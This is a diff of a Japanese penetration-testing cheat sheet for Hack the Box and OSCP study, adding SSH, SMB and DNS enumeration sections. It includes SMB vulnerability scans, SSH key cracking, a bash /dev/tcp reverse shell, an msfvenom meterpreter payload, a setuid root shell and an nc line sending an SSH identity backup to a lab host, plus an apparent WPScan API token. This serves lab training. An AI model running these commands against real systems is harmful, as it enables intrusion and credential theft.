@@ -11,6 +11,9 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
 - [Network Scan](#Network_scan)
   - [Nmap](#nmap)
   - [AutoRecon](#autorecon)
+- [SSH](#SSH)
+- [SMB](#SMB(139,445))
+- [DNS](#DNS(53))
 - [Web Scan](#Web_scan)
   - [gobuster](#gobuster)
   - [dirb](#dirb)
@@ -41,7 +44,6 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
 - [SQL injection](#SQLインジェクション)
 - [LFI](#LFI)
 - [リバースエンジニアリング](#リバースエンジニアリング)
-- [DNS](#DNS)
 - [便利コマンド](#便利コマンド)
     
   
@@ -122,17 +124,6 @@ aggressive
 
 ```
 
-全 port scan
-
-```
-
-nmap -A -p- -Pn 10.10.10.3
-
--p-: 全port scan
-
-```
-
-
  known vulnerabilitiesに対して、調査したいとき
 
 ```
@@ -158,7 +149,151 @@ AutoReconは、まずTCPのデフォルト1000ポートスキャンのNmapScan�
 同時並行でTCP fullNmapScanも実行し、そこで新たに見つかったサービスに対してもさらにNmapなどを実行してくれる。
 
 
+# SSH(22)
+
+
+### SCP
+カレントディレクトリにsecret.zipをダウンロード
+
+```
+scp charix@10.10.10.84:/home/charix/secret.zip .
+
+```
+
+
+### フォワーディング
+
+```
+ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+
+```
+
+
+### ssh のid_rsa が暗号化されてる時
+
+```
+
+python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa > ~/Desktop/htb/brainfuck/ssh-key
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh-key
+
+```
+
+### ssh-keygen
+
+```
+ssh-keygen -t rsa -f id_rsa
+chmod 600 id_rsa
+```
+- -t...暗号の種類(ed25519,rsaなど)
+- -b...ビット数の固定(-t rsa -b 4096など)
+- -f...ファイル名(id_????の?部分)
+
+
+# SMB(139,445)
+
+### minimum Todo
+
+```
+
+// SMBによるOSの検出や列挙(smb-os-discovery)
+nmap -v -p 139, 445 --script=smb-os-discovery <target ip>
+
+// SMBプロトコルの既知の脆弱性をチェックする場合
+nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <target ip>
+
+// 匿名ログインが有効になっているか確認
+smbclient -N -L <target ip>
+
+// WindowsおよびSambaホストからのデータを列挙
+enum4linux -U -o <target ip>
+
+enum4linux -S <target ip>
+
+enum4linux -P <target ip>
+
+- -U...ユーザリスト取得
+- -o...OS情報取得
+- -S...sharelist取得
+- -P...password policy情報取得
+
+```
+
+
+
+# DNS(53)
+
+### ドメイン名の特定
+DNSサーバー = 10.10.10.13  
+ドメイン名を調べたいIPアドレス = 10.10.10.13  
+10.10.10.13 = ns1.cronos.htb
+```
+┌──(kali㉿kali)-[~]
+└─$ nslookup
+> server 10.10.10.13　# DNSサーバーの指定
+Default server: 10.10.10.13
+Address: 10.10.10.13#53
+> 10.10.10.13　# ドメイン名を知りたいIPアドレスの指定
+13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
+```
+
+### サブドメインの列挙
+#### DNSゾーン転送
+権威DNSサーバの設定不備によってゾーン情報を取得できることがある。  
+これによりサーバーの名前、アドレス、機能などを調べることができる。
+```
+dig axfr cronos.htb @10.10.10.13
+```
+```
+host -l <domain name> <dns server address>
+```
+
+#### DNSRecon
+DNS列挙スクリプト。  
+サブドメインの列挙。(ゾーン転送とブルートフォース)
+```
+1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
+2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
+```
+- -d...ドメイン名の指定
+- -t...実行する列挙の種類(1つ目はゾーン転送)
+- -t...実行する列挙の種類(2つ目はブルートフォース)
+- -D...サブドメイン文字列を含むワードリストファイルの指定
+
+#### DNSmap
+サブドメインの列挙。(ブルートフォース)
+```
+┌──(root💀kali)-[/home/kali/htb/boxes/Cronos]
+└─# dnsmap cronos.htb -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt                                                                127 ⨯
+dnsmap 0.35 - DNS Network Mapper
+
+[+] searching (sub)domains for cronos.htb using /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
+[+] using maximum random delay of 10 millisecond(s) between requests
+
+www.cronos.htb
+IP address #1: 10.10.10.13
+[+] warning: internal IP address disclosed
+
+admin.cronos.htb
+IP address #1: 10.10.10.13
+[+] warning: internal IP address disclosed
+```
+
+
 # Web_scan
+
+ファジングを高速に、簡便にという意味が込められたWEBファジングツール
+
+### ffuf
+
+[公式](https://github.com/ffuf/ffuf)
+
+[解説記事](https://jpn.nec.com/cybersecurity/blog/210604/index.html)
+
+```
+
+ffuf -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 
+
+```
 
 ### gobuster
 
@@ -275,14 +410,13 @@ wpscan --url 10.10.10.17 -e u,vp --api-token KDuAhQpTshtAEPxDLNZLiWrkszFxb8kf8t6
 
 ## reverse_shell
 
-### PayloadAllTheThings
 
-[リンク](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 reverse_shell 全部乗ってて、大変便利
 
 
-### msfvenom_reverse_shell
+#### msfvenom_reverse_shell
 
 [CheetSheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
 
@@ -291,7 +425,7 @@ reverse_shell 全部乗ってて、大変便利
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 ```
 
-#### shell
+#### bash
 ```
 bash -i >& /dev/tcp/[url]/[port] 0>&1
 
@@ -355,6 +489,8 @@ run
 
 [上記、簡易日本語版](https://syachineko.hatenablog.com/entry/2020/09/07/213646)
 
+[その他資料: HackTricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
+
 とっかかりは、ps aux で良さそう。
 ps -auxww | grep vnc　とかで、細かく情報見る。
 
@@ -409,7 +545,10 @@ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 [毎回必ず見る資料](https://xorond.com/posts/2021/04/windows-local-privilege-escalation/)
 
-https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+[その他資料: HackTricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
+
+
 
 systeminfo で、OS name, OS version をcheck.
 
@@ -712,7 +851,9 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup
 
 # SQLインジェクション
 
-[CheetSheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
+[CheetSheet1](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
+
+[CheetSheet2](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)
 
 [リンク](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ja-JP.md)
 
@@ -824,63 +965,6 @@ $ radare2 rev100
 
 ```
 
-# DNS
-
-### ドメイン名の特定
-DNSサーバー = 10.10.10.13  
-ドメイン名を調べたいIPアドレス = 10.10.10.13  
-10.10.10.13 = ns1.cronos.htb
-```
-┌──(kali㉿kali)-[~]
-└─$ nslookup
-> server 10.10.10.13　# DNSサーバーの指定
-Default server: 10.10.10.13
-Address: 10.10.10.13#53
-> 10.10.10.13　# ドメイン名を知りたいIPアドレスの指定
-13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
-```
-
-### サブドメインの列挙
-#### DNSゾーン転送
-権威DNSサーバの設定不備によってゾーン情報を取得できることがある。  
-これによりサーバーの名前、アドレス、機能などを調べることができる。
-```
-dig axfr cronos.htb @10.10.10.13
-```
-```
-host -l <domain name> <dns server address>
-```
-
-#### DNSRecon
-DNS列挙スクリプト。  
-サブドメインの列挙。(ゾーン転送とブルートフォース)
-```
-1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
-2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
-```
-- -d...ドメイン名の指定
-- -t...実行する列挙の種類(1つ目はゾーン転送)
-- -t...実行する列挙の種類(2つ目はブルートフォース)
-- -D...サブドメイン文字列を含むワードリストファイルの指定
-
-#### DNSmap
-サブドメインの列挙。(ブルートフォース)
-```
-┌──(root💀kali)-[/home/kali/htb/boxes/Cronos]
-└─# dnsmap cronos.htb -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt                                                                127 ⨯
-dnsmap 0.35 - DNS Network Mapper
-
-[+] searching (sub)domains for cronos.htb using /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
-[+] using maximum random delay of 10 millisecond(s) between requests
-
-www.cronos.htb
-IP address #1: 10.10.10.13
-[+] warning: internal IP address disclosed
-
-admin.cronos.htb
-IP address #1: 10.10.10.13
-[+] warning: internal IP address disclosed
-```
 
 # 便利コマンド
 
@@ -1026,13 +1110,6 @@ nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-ident
 
 ```
 
-- ssh のid_rsa が暗号化されてる時
-
-```
-
-python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa > ~/Desktop/htb/brainfuck/ssh-key
-
-```
 
 
 - Windows で user.txt を探したい
